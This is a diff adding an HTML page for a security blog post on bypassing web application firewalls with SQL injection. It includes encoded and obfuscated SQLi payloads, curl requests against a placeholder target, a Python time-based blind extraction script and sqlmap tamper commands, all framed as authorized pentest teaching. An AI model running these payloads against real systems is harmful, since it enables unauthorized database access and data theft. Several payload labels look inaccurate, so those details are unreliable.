@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="An in-depth look at bypassing modern Web Application Firewalls using advanced SQL injection techniques.">
+  <meta property="og:title" content="SQL Injection: Modern WAF Bypass Techniques">
+  <meta property="og:type" content="article">
+  <title>SQL Injection: Modern WAF Bypass Techniques | 0xHacker</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+
+<div id="reading-progress"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo"><span>~/</span>0xhacker<span class="cursor"></span></a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html" class="active">Blog</a></li>
+      <li><a href="../ctf/index.html">CTF Writeups</a></li>
+      <li><a href="../about/index.html">About</a></li>
+    </ul>
+    <div class="nav-actions">
+      <div class="nav-search">
+        <span class="search-icon"><i class="fas fa-search"></i></span>
+        <input type="search" id="search-input" placeholder="Search...">
+      </div>
+      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme"></button>
+      <button class="hamburger" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</nav>
+
+<div id="search-results"></div>
+
+<!-- Breadcrumb -->
+<div style="padding:5rem 0 0;background:var(--bg-secondary);border-bottom:1px solid var(--border)">
+  <div class="container" style="padding-bottom:1rem">
+    <nav aria-label="Breadcrumb" style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted)">
+      <a href="../index.html" style="color:var(--text-muted)">~</a>
+      <span style="margin:0 0.4rem">/</span>
+      <a href="index.html" style="color:var(--text-muted)">blog</a>
+      <span style="margin:0 0.4rem">/</span>
+      <span style="color:var(--accent-green)">sql-injection-bypass</span>
+    </nav>
+  </div>
+</div>
+
+<!-- Post Header -->
+<div style="background:var(--bg-secondary);padding-bottom:3rem">
+  <div class="container" style="max-width:900px">
+    <div class="post-header" style="border:none;padding:2rem 0 0;margin:0">
+      <div class="post-meta" style="margin-bottom:1rem">
+        <span class="post-date">📅 December 15, 2024</span>
+        <span class="post-read-time">⏱ 8 min read</span>
+        <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">
+          <i class="fas fa-user"></i> Your Name
+        </span>
+      </div>
+      <h1 class="post-hero-title">SQL Injection: Modern WAF Bypass Techniques</h1>
+      <div class="post-tags" style="margin-top:1rem">
+        <span class="tag">web</span>
+        <span class="tag">sqli</span>
+        <span class="tag">bypass</span>
+        <span class="tag">pentest</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Post Body -->
+<section style="padding:3rem 0">
+  <div class="container" style="max-width:1100px">
+    <div class="post-layout">
+      <!-- Main Content -->
+      <article class="post-body">
+
+        <div class="callout">
+          <strong>⚠️ Disclaimer:</strong> This content is for educational purposes only.
+          Only test on systems you own or have explicit written permission to test.
+        </div>
+
+        <h2 id="introduction">Introduction</h2>
+        <p>
+          Web Application Firewalls (WAFs) are often the last line of defense between an attacker
+          and a vulnerable SQL injection endpoint. Modern WAFs from vendors like Cloudflare, Akamai,
+          and AWS WAF have become increasingly sophisticated, but they're not impenetrable.
+        </p>
+        <p>
+          In this post, we'll explore practical techniques for bypassing WAF protections during
+          authorized penetration tests, focusing on encoding tricks, case manipulation, and
+          comment injection.
+        </p>
+
+        <h2 id="understanding-waf">Understanding WAF Detection</h2>
+        <p>
+          WAFs primarily operate in two modes: signature-based detection and behavioral analysis.
+          Signature-based detection looks for known malicious patterns, while behavioral analysis
+          examines request patterns and anomalies.
+        </p>
+        <p>
+          Most WAFs will block classic payloads like:
+        </p>
+        <pre data-lang="sql"><code><span class="st">' OR 1=1--</span>
+<span class="st">' UNION SELECT 1,2,3--</span>
+<span class="st">'; DROP TABLE users;--</span></code></pre>
+
+        <p>
+          The key insight is that SQL is flexible — there are often dozens of ways to express
+          the same query, and WAFs can't catch them all.
+        </p>
+
+        <h2 id="encoding-tricks">Encoding Tricks</h2>
+        <p>
+          URL encoding, double URL encoding, and Unicode encoding are some of the most reliable
+          bypass techniques. Many WAFs decode once before checking, but the application server
+          may decode multiple times.
+        </p>
+
+        <pre data-lang="bash"><code><span class="cm"># Standard payload (blocked)</span>
+<span class="fn">curl</span> <span class="st">"https://target.com/search?q=' OR 1=1--"</span>
+
+<span class="cm"># URL-encoded (might bypass)</span>
+<span class="fn">curl</span> <span class="st">"https://target.com/search?q=%27%20OR%201%3D1--"</span>
+
+<span class="cm"># Double URL-encoded</span>
+<span class="fn">curl</span> <span class="st">"https://target.com/search?q=%2527%2520OR%25201%253D1--"</span>
+
+<span class="cm"># Unicode encoding</span>
+<span class="fn">curl</span> <span class="st">"https://target.com/search?q=\u0027 OR 1=1--"</span></code></pre>
+
+        <h2 id="comment-injection">Comment Injection & Whitespace</h2>
+        <p>
+          SQL supports various comment styles that can be used to break up keywords and confuse
+          WAF pattern matching:
+        </p>
+
+        <pre data-lang="sql"><code><span class="cm">-- Standard comment bypass</span>
+<span class="st">'/**/OR/**/1=1--</span>
+
+<span class="cm">-- MySQL inline comment with version</span>
+<span class="st">'/*!50000 OR*/ 1=1--</span>
+
+<span class="cm">-- Mixed case (case-insensitive SQL but WAF is case-sensitive)</span>
+<span class="st">' oR 1=1--</span>
+<span class="st">' Or 1=1--</span>
+<span class="st">' OR/**/ 1=1--</span>
+
+<span class="cm">-- Tab/newline whitespace</span>
+<span class="st">'%09OR%091=1--</span>  <span class="cm">-- Tab characters</span>
+<span class="st">'%0aOR%0a1=1--</span>  <span class="cm">-- Newlines</span></code></pre>
+
+        <h2 id="union-bypass">UNION SELECT Bypass</h2>
+        <p>
+          UNION-based injection is heavily filtered. Here are techniques to bypass UNION SELECT
+          detection:
+        </p>
+
+        <pre data-lang="sql"><code><span class="cm">-- Scientific notation for numbers</span>
+<span class="st">' UNION SELECT 1e0,2e0,3e0--</span>
+
+<span class="cm">-- UNION with parentheses</span>
+<span class="st">' UNION(SELECT(1),(2),(3))--</span>
+
+<span class="cm">-- All%00 null byte injection</span>
+<span class="st">'%00UNION%00SELECT%001,2,3--</span>
+
+<span class="cm">-- Minus sign trick</span>
+<span class="st">'UNION--%0ASELECT 1,2,3--</span></code></pre>
+
+        <h2 id="time-based">Time-Based Blind Injection</h2>
+        <p>
+          When output is not reflected, time-based blind injection can confirm vulnerability
+          without triggering WAF UNION/UNION SELECT rules:
+        </p>
+
+        <pre data-lang="python"><code><span class="kw">import</span> requests
+<span class="kw">import</span> time
+
+<span class="kw">def</span> <span class="fn">time_based_sqli</span>(url, column, table):
+    payload = <span class="st">f"1; IF(1=1,WAITFOR DELAY '0:0:5',0)--"</span>
+    start = time.time()
+    r = requests.get(url, params={<span class="st">'id'</span>: payload})
+    elapsed = time.time() - start
+    
+    <span class="kw">if</span> elapsed > <span class="nm">4.5</span>:
+        <span class="fn">print</span>(<span class="st">f"[+] Vulnerable! Response delayed {elapsed:.1f}s"</span>)
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="cm"># Exfiltrate data character by character</span>
+<span class="kw">def</span> <span class="fn">extract_data</span>(url, query):
+    result = <span class="st">""</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="nm">1</span>, <span class="nm">50</span>):
+        <span class="kw">for</span> char <span class="kw">in</span> <span class="st">"abcdefghijklmnopqrstuvwxyz0123456789{}_-"</span>:
+            payload = (
+                <span class="st">f"1; IF(ASCII(SUBSTRING(({query}),{i},1))="</span>
+                <span class="st">f"{ord(char)},WAITFOR DELAY '0:0:1',0)--"</span>
+            )
+            start = time.time()
+            requests.get(url, params={<span class="st">'id'</span>: payload})
+            <span class="kw">if</span> time.time() - start > <span class="nm">0.9</span>:
+                result += char
+                <span class="fn">print</span>(<span class="st">f"\r[*] {result}"</span>, end=<span class="st">""</span>)
+                <span class="kw">break</span>
+    <span class="kw">return</span> result</code></pre>
+
+        <h2 id="automation">Automating Bypasses with SQLMap</h2>
+        <p>
+          SQLMap has a tamper script system for automating WAF bypasses. Always use
+          <code>--random-agent</code> and appropriate tamper scripts:
+        </p>
+
+        <pre data-lang="bash"><code><span class="cm"># Basic WAF bypass with tamper scripts</span>
+sqlmap -u <span class="st">"https://target.com/page?id=1"</span> \
+  --tamper=<span class="st">space2comment,randomcase,charencode</span> \
+  --random-agent \
+  --level=5 \
+  --risk=3 \
+  -p id
+
+<span class="cm"># Useful tamper scripts:</span>
+<span class="cm"># space2comment  - replaces spaces with /**/</span>
+<span class="cm"># randomcase     - randomizes keyword case</span>
+<span class="cm"># charencode     - URL encodes characters</span>
+<span class="cm"># between        - replaces > with NOT BETWEEN 0 AND</span>
+<span class="cm"># equaltolike    - replaces = with LIKE</span></code></pre>
+
+        <h2 id="conclusion">Conclusion</h2>
+        <p>
+          WAF bypass is an arms race — vendors patch known bypasses, researchers find new ones.
+          The most effective approach combines multiple techniques and always starts with
+          understanding what the WAF is actually filtering.
+        </p>
+
+        <div class="callout warning">
+          <strong>💡 Pro tip:</strong> If you find a live WAF bypass on a real application during
+          a bug bounty, document it thoroughly before reporting. Include the exact payload,
+          the WAF vendor/version if known, and the impact.
+        </div>
+
+        <p>
+          In the next post, we'll explore second-order SQL injection — a technique where the
+          payload is stored and executed later, bypassing input filters entirely.
+        </p>
+
+        <!-- Post Footer -->
+        <div style="margin-top:3rem;padding-top:2rem;border-top:1px solid var(--border)">
+          <div style="display:flex;align-items:center;gap:1rem;flex-wrap:wrap">
+            <span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted)">Tags:</span>
+            <span class="tag">web</span>
+            <span class="tag">sqli</span>
+            <span class="tag">bypass</span>
+            <span class="tag">pentest</span>
+          </div>
+          <div style="display:flex;gap:1rem;margin-top:1.5rem">
+            <a href="https://twitter.com/intent/tweet?text=SQL Injection WAF Bypass Techniques&url=" class="btn btn-outline" target="_blank">
+              <i class="fab fa-x-twitter"></i> Share
+            </a>
+            <a href="index.html" class="btn btn-outline">
+              <i class="fas fa-arrow-left"></i> All Posts
+            </a>
+          </div>
+        </div>
+
+      </article>
+
+      <!-- Table of Contents Sidebar -->
+      <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">// Contents</div>
+        <ul class="toc-list">
+          <li><a href="#introduction">Introduction</a></li>
+          <li><a href="#understanding-waf">Understanding WAF Detection</a></li>
+          <li><a href="#encoding-tricks">Encoding Tricks</a></li>
+          <li><a href="#comment-injection">Comment Injection</a></li>
+          <li><a href="#union-bypass">UNION SELECT Bypass</a></li>
+          <li><a href="#time-based">Time-Based Blind Injection</a></li>
+          <li><a href="#automation">Automating with SQLMap</a></li>
+          <li><a href="#conclusion">Conclusion</a></li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<footer id="footer">
+  <div class="container">
+    <div class="footer-bottom" style="border:none;padding:0">
+      <span class="footer-copy">© <span id="year"></span> 0xHacker</span>
+      <div class="footer-social">
+        <a href="https://github.com/yourusername" class="social-link" target="_blank" rel="noopener"><i class="fab fa-github"></i></a>
+        <a href="https://twitter.com/yourhandle" class="social-link" target="_blank" rel="noopener"><i class="fab fa-x-twitter"></i></a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<button id="back-to-top" aria-label="Back to top"><i class="fas fa-chevron-up"></i></button>
+
+<script src="../js/data.js"></script>
+<script src="../js/main.js"></script>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
